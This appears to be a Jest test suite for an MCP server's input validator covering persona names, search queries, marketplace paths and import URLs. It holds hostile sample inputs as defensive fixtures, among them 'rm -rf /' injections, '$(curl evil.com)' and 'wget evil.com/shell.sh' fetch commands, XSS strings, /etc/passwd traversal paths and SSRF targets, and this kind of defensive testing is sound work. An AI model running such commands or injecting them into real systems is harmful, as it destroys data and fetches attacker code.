import { describe, test, expect } from '@jest/globals';
import { MCPInputValidator } from '../../src/security/InputValidator.js';

describe('MCPInputValidator - Enhanced MCP Tool Input Validation', () => {
  describe('validatePersonaIdentifier', () => {
    test('should accept valid persona identifiers', () => {
      expect(MCPInputValidator.validatePersonaIdentifier('Creative Writer')).toBe('Creative Writer');
      expect(MCPInputValidator.validatePersonaIdentifier('debug-detective.md')).toBe('debug-detective.md');
      expect(MCPInputValidator.validatePersonaIdentifier('test_persona_v2')).toBe('test_persona_v2');
    });

    test('should reject empty or invalid identifiers', () => {
      expect(() => MCPInputValidator.validatePersonaIdentifier('')).toThrow('Persona identifier must be a non-empty string');
      expect(() => MCPInputValidator.validatePersonaIdentifier('   ')).toThrow('Persona identifier contains only invalid characters');
      expect(() => MCPInputValidator.validatePersonaIdentifier('a'.repeat(101))).toThrow('Persona identifier too long');
    });

    test('should sanitize dangerous characters', () => {
      const result = MCPInputValidator.validatePersonaIdentifier('test; rm -rf /');
      expect(result).toBe('test rm -rf /'); // Semicolon removed
      expect(result).not.toContain(';');
    });
  });

  describe('validateSearchQuery', () => {
    test('should accept valid search queries', () => {
      expect(MCPInputValidator.validateSearchQuery('creative writing')).toBe('creative writing');
      expect(MCPInputValidator.validateSearchQuery('debug programming')).toBe('debug programming');
      expect(MCPInputValidator.validateSearchQuery('ai assistant help')).toBe('ai assistant help');
    });

    test('should enforce length limits', () => {
      expect(() => MCPInputValidator.validateSearchQuery('a')).toThrow('Search query too short');
      expect(() => MCPInputValidator.validateSearchQuery('a'.repeat(201))).toThrow('Search query too long');
    });

    test('should sanitize dangerous patterns', () => {
      const result = MCPInputValidator.validateSearchQuery('search <script>alert(1)</script>');
      expect(result).toBe('search scriptalert1/script'); // HTML tags and parentheses removed
      expect(result).not.toContain('<script>');
      expect(result).not.toContain('(');
    });

    test('should reject queries with only invalid characters', () => {
      expect(() => MCPInputValidator.validateSearchQuery(';;;')).toThrow('Search query contains only invalid characters');
    });
  });

  describe('validateMarketplacePath', () => {
    test('should accept valid GitHub paths', () => {
      expect(MCPInputValidator.validateMarketplacePath('creative/storyteller.md')).toBe('creative/storyteller.md');
      expect(MCPInputValidator.validateMarketplacePath('professional/excel-expert.md')).toBe('professional/excel-expert.md');
      expect(MCPInputValidator.validateMarketplacePath('category/sub-category/persona.md')).toBe('category/sub-category/persona.md');
    });

    test('should reject path traversal attempts', () => {
      expect(() => MCPInputValidator.validateMarketplacePath('../../../etc/passwd')).toThrow('Path traversal not allowed');
      expect(() => MCPInputValidator.validateMarketplacePath('./admin/secrets')).toThrow('Path traversal not allowed');
      // Test enhanced path traversal protection
      expect(() => MCPInputValidator.validateMarketplacePath('admin/../../../etc/passwd')).toThrow('Path traversal not allowed');
      expect(() => MCPInputValidator.validateMarketplacePath('admin%2e%2e%2f')).toThrow('Path traversal not allowed');
      expect(() => MCPInputValidator.validateMarketplacePath('admin%252e%252e')).toThrow('Path traversal not allowed');
      expect(() => MCPInputValidator.validateMarketplacePath('admin..%2f')).toThrow('Path traversal not allowed');
    });

    test('should reject invalid path formats', () => {
      expect(() => MCPInputValidator.validateMarketplacePath('invalid<>path')).toThrow('Invalid character \'<\' in marketplace path at position 8');
      expect(() => MCPInputValidator.validateMarketplacePath('path with spaces')).toThrow('Invalid character \' \' in marketplace path at position 5');
    });

    test('should enforce length limits', () => {
      expect(() => MCPInputValidator.validateMarketplacePath('a'.repeat(501))).toThrow('Marketplace path too long');
    });
  });

  describe('validateImportUrl', () => {
    test('should accept valid HTTP(S) URLs', () => {
      expect(MCPInputValidator.validateImportUrl('https://example.com/persona.json')).toBe('https://example.com/persona.json');
      expect(MCPInputValidator.validateImportUrl('http://gist.github.com/user/123')).toBe('http://gist.github.com/user/123');
    });

    test('should reject non-HTTP protocols', () => {
      expect(() => MCPInputValidator.validateImportUrl('ftp://example.com/file')).toThrow('Only HTTP(S) URLs are allowed');
      expect(() => MCPInputValidator.validateImportUrl('file:///etc/passwd')).toThrow('Only HTTP(S) URLs are allowed');
      expect(() => MCPInputValidator.validateImportUrl('javascript:alert(1)')).toThrow('Only HTTP(S) URLs are allowed');
    });

    test('should reject private network URLs (SSRF protection)', () => {
      expect(() => MCPInputValidator.validateImportUrl('http://localhost:8080/admin')).toThrow('Private network URLs are not allowed');
      expect(() => MCPInputValidator.validateImportUrl('http://127.0.0.1:22')).toThrow('Private network URLs are not allowed');
      expect(() => MCPInputValidator.validateImportUrl('http://192.168.1.1/config')).toThrow('Private network URLs are not allowed');
      expect(() => MCPInputValidator.validateImportUrl('http://10.0.0.1/secrets')).toThrow('Private network URLs are not allowed');
      expect(() => MCPInputValidator.validateImportUrl('http://172.16.0.1/admin')).toThrow('Private network URLs are not allowed');
      // Test enhanced SSRF protection
      expect(() => MCPInputValidator.validateImportUrl('//localhost/admin')).toThrow('Protocol-relative URLs are not allowed');
      expect(() => MCPInputValidator.validateImportUrl('//127.0.0.1/secrets')).toThrow('Protocol-relative URLs are not allowed');
    });

    test('should reject malformed URLs', () => {
      expect(() => MCPInputValidator.validateImportUrl('not-a-url')).toThrow('Invalid URL format');
      expect(() => MCPInputValidator.validateImportUrl('http://')).toThrow('Invalid URL format');
    });

    test('should enforce length limits', () => {
      expect(() => MCPInputValidator.validateImportUrl('https://example.com/' + 'a'.repeat(2000))).toThrow('URL too long');
    });
  });

  describe('validateExpiryDays', () => {
    test('should accept valid expiry days', () => {
      expect(MCPInputValidator.validateExpiryDays(7)).toBe(7);
      expect(MCPInputValidator.validateExpiryDays(30)).toBe(30);
      expect(MCPInputValidator.validateExpiryDays(365)).toBe(365);
    });

    test('should round down decimal values', () => {
      expect(MCPInputValidator.validateExpiryDays(7.9)).toBe(7);
      expect(MCPInputValidator.validateExpiryDays(30.1)).toBe(30);
    });

    test('should reject invalid ranges', () => {
      expect(() => MCPInputValidator.validateExpiryDays(0)).toThrow('Expiry days must be between 1 and 365');
      expect(() => MCPInputValidator.validateExpiryDays(366)).toThrow('Expiry days must be between 1 and 365');
      expect(() => MCPInputValidator.validateExpiryDays(-5)).toThrow('Expiry days must be between 1 and 365');
    });

    test('should reject non-numeric values', () => {
      expect(() => MCPInputValidator.validateExpiryDays(NaN)).toThrow('Expiry days must be a valid number');
      expect(() => MCPInputValidator.validateExpiryDays(Infinity)).toThrow('Expiry days must be a valid number');
      expect(() => MCPInputValidator.validateExpiryDays('7' as any)).toThrow('Expiry days must be a valid number');
    });
  });

  describe('validateConfirmation', () => {
    test('should accept true confirmation', () => {
      expect(MCPInputValidator.validateConfirmation(true, 'Update')).toBe(true);
    });

    test('should reject false confirmation', () => {
      expect(() => MCPInputValidator.validateConfirmation(false, 'Update')).toThrow('Update operation requires explicit confirmation');
    });

    test('should reject non-boolean values', () => {
      expect(() => MCPInputValidator.validateConfirmation('true' as any, 'Update')).toThrow('Update confirmation must be a boolean value');
      expect(() => MCPInputValidator.validateConfirmation(1 as any, 'Update')).toThrow('Update confirmation must be a boolean value');
    });
  });

  describe('validateEditField', () => {
    test('should accept valid field names', () => {
      expect(MCPInputValidator.validateEditField('name')).toBe('name');
      expect(MCPInputValidator.validateEditField('Description')).toBe('description'); // Normalized to lowercase
      expect(MCPInputValidator.validateEditField('CATEGORY')).toBe('category');
      expect(MCPInputValidator.validateEditField('instructions')).toBe('instructions');
    });

    test('should reject invalid field names', () => {
      expect(() => MCPInputValidator.validateEditField('invalid_field')).toThrow('Invalid field name');
      expect(() => MCPInputValidator.validateEditField('password')).toThrow('Invalid field name');
      expect(() => MCPInputValidator.validateEditField('metadata')).toThrow('Invalid field name');
    });

    test('should handle whitespace normalization', () => {
      expect(MCPInputValidator.validateEditField('  name  ')).toBe('name');
      expect(MCPInputValidator.validateEditField('\ttriggers\n')).toBe('triggers');
    });
  });

  describe('Security Integration Tests', () => {
    test('should handle polyglot attacks across validators', () => {
      // Test that multiple validators consistently handle complex attacks
      const polyglotPayload = '"; rm -rf /; echo "pwned';
      
      expect(() => MCPInputValidator.validateSearchQuery(polyglotPayload)).not.toThrow();
      const sanitizedQuery = MCPInputValidator.validateSearchQuery(polyglotPayload);
      expect(sanitizedQuery).not.toContain(';');
      expect(sanitizedQuery).not.toContain('"');
    });

    test('should maintain consistent error handling', () => {
      // All validators should throw Error objects with descriptive messages
      expect(() => MCPInputValidator.validatePersonaIdentifier('')).toThrow(Error);
      expect(() => MCPInputValidator.validateSearchQuery('')).toThrow(Error);
      expect(() => MCPInputValidator.validateMarketplacePath('')).toThrow(Error);
      expect(() => MCPInputValidator.validateImportUrl('')).toThrow(Error);
    });

    test('should prevent injection across all input types', () => {
      const injectionPayloads = [
        '<script>alert(1)</script>',
        '; rm -rf /',
        '$(curl evil.com)',
        '`touch /tmp/pwned`',
        '|| wget evil.com/shell.sh'
      ];

      injectionPayloads.forEach(payload => {
        // Should not throw but should sanitize
        const personaResult = MCPInputValidator.validatePersonaIdentifier('test' + payload);
        expect(personaResult).not.toContain('<script>');
        expect(personaResult).not.toContain(';');
        expect(personaResult).not.toContain('`');
      });
    });
  });
});